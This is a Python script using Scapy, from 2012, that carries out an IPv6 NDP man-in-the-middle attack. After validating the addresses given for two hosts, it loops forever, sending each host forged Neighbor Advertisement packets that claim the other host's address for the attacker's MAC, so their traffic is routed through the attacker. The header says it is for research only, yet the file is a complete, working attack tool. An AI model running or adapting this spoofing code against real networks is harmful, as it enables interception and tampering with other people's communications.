#! /usr/bin/env python

#############################################################################
##                                                                         ##
## ndp_mitm.py                                                             ##
##                                                                         ##
## NDP Man in the middle (ICMPv6/NDP/NA)                                   ##
## Execute a MITM attack by flooding Neighbor Advertisement packets        ##
##                                                                         ##
## Use this script only on your own devices and your own network!          ##
## This script is for research and academic purposes only!                 ##
##                                                                         ##
## Copyright (C) 2012 : Benjamin Bachelart <ben@bashy.eu>                  ##
## http://blog.bashy.eu/                                                   ##
##                                                                         ##
## This program is under CC LICENSE 3.0 BY-NC-SA :                         ##
## http://creativecommons.org/licenses/by-nc-sa/3.0/                       ##
##                                                                         ##
## There is NO warranty provided with this software.                       ##
##                                                                         ##
## Type python ndp_mitm.py --help for syntax                               ##
## Version : 0.2 (20/10/2012)                                              ##
##                                                                         ##
#############################################################################

from scapy.all import *
import sys, getopt, re, time

def usage(): print "Usage: python ndp_mitm.py [-h | --help] [-v | --verbose] [-t | --display-time] interface mac_host1_addr IPv6_host1_lladdr mac_host2_addr IPv6_host2_lladdr host1_rtrflag host2_rtrflag\n\nThis script is under CC LICENSE 3.0 BY-NC-SA.\n\nFeel free to report any bug or suggestion to <ben@bashy.eu>."

try:
 opts, args = getopt.getopt(sys.argv[1:], "hvft", ["help", "verbose", "display-time"])
except getopt.GetoptError, err:
 print str(err)
 usage()
 exit(1)

# default values for optional parameters
displayTime = False
verbose = False
host1_rtrflag = 0
host2_rtrflag = 0

for opt, arg in opts:
 if opt in ('-h', '--help'):
  usage()
  exit()
 elif opt in ('-v', '--verbose'):
  verbose = True
 elif opt in ('-t', '--display-time'):
  displayTime = True

# check size of args
if len(args) != 5 and len(args) != 7:
 print 'Invalid number of arguments, 5 or 7 (router flags) expected.'
 usage()
 exit(1)
else:
 if args[0] not in get_if_list(): # check wether interface passed in arg exist.
  print 'This interface does not exist.'
  exit(1)
 else: interface = args[0]
 
 # check mac_host1_addr
 if re.match("^([a-fA-F0-9]{2}(:|-)){5}[a-fA-F0-9]{2}$", args[1]) is None:
  print 'Incorrect format for mac_host1_addr.\nOP:QR:ST:UV:WX:YZ format expected.'
  exit(1)
 else: mac_host1_addr = str.replace(args[1], '-', ':')
 
 # check mac_host2_addr
 if re.match("^([a-fA-F0-9]{2}(:|-)){5}[a-fA-F0-9]{2}$", args[3]) is None:
  print 'Incorrect format for mac_host2_addr.\nOP:QR:ST:UV:WX:YZ format expected.'
  exit(1)
 else: mac_host2_addr = str.replace(args[3], '-', ':')
 
 # check IPv6_host1_lladdr
 try:
  if not in6_islladdr(args[2]): 
   print 'The IPv6 address given as host1_lladdr is not a link-local address.'
   exit(1)
  else: IPv6_host1_lladdr = args[2]
 except error: 
  print 'Incorrect format for ipv6 host1_lladdr.'
  exit(1)
 
 # check IPv6_host2_lladdr
 try:
  if not in6_islladdr(args[4]): 
   print 'The IPv6 address given as host2_lladdr is not a link-local address.'
   exit(1)
  else: IPv6_host2_lladdr = args[4]
 except error: 
  print 'Incorrect format for ipv6 host2_lladdr.'
  exit(1)

 # check rtr flags for host1
 if len(args) != 5:
  if re.match("^(0|1){1}$", args[5]) is None:
   print 'host1_rtrflag must be 0 or 1.'
   exit(1)
  else: host1_rtrflag = int(args[5])
 # check rtr flags for host2
 if len(args) != 5:
  if re.match("^(0|1){1}$", args[6]) is None:
   print 'host2_rtrflag must be 0 or 1.'
   exit(1)
  else: host2_rtrflag = int(args[6])

while(1):
 try:
  # preparing packet to send to host1 (we take over the place of host2)
  ether=Ether(src=get_if_hwaddr(interface),dst=mac_host1_addr)
  ip6=IPv6(src=IPv6_host2_lladdr, dst=IPv6_host1_lladdr)
  na=ICMPv6ND_NA(tgt=IPv6_host2_lladdr, R=host2_rtrflag, S=1, O=1)
  lla=ICMPv6NDOptDstLLAddr(lladdr=get_if_hwaddr(interface))
  sendp(ether/ip6/na/lla, iface=interface, verbose=0)
  if verbose:
   pTime = time.strftime("%b %d %Y %H:%M:%S", time.localtime())+' ' if displayTime else ''
   print pTime + '[NDP MITM] - NA Packet (' + IPv6_host2_lladdr + ' -> '+ get_if_hwaddr(interface) +') to '+ IPv6_host1_lladdr +' (hwaddr : '+ mac_host1_addr +')  SENT'
  
  # preparing packet to send to host2 (we now take over the place of host1)
  ether=Ether(src=get_if_hwaddr(interface),dst=mac_host2_addr)
  ip6=IPv6(src=IPv6_host1_lladdr, dst=IPv6_host2_lladdr)
  na=ICMPv6ND_NA(tgt=IPv6_host1_lladdr, R=host1_rtrflag, S=1, O=1)
  lla=ICMPv6NDOptDstLLAddr(lladdr=get_if_hwaddr(interface))
  sendp(ether/ip6/na/lla, iface=interface, verbose=0)
  if verbose:
   pTime = time.strftime("%b %d %Y %H:%M:%S", time.localtime())+' ' if displayTime else ''
   print pTime + '[NDP MITM] - NA Packet (' + IPv6_host1_lladdr + ' -> '+ get_if_hwaddr(interface) +') to '+ IPv6_host2_lladdr +' (hwaddr : '+ mac_host2_addr +')  SENT'
  
  time.sleep(0.7) # feel free to change this param (in second)
 except KeyboardInterrupt:
  print '\n[NDP MITM] - Program interrupted.'
  sys.exit()
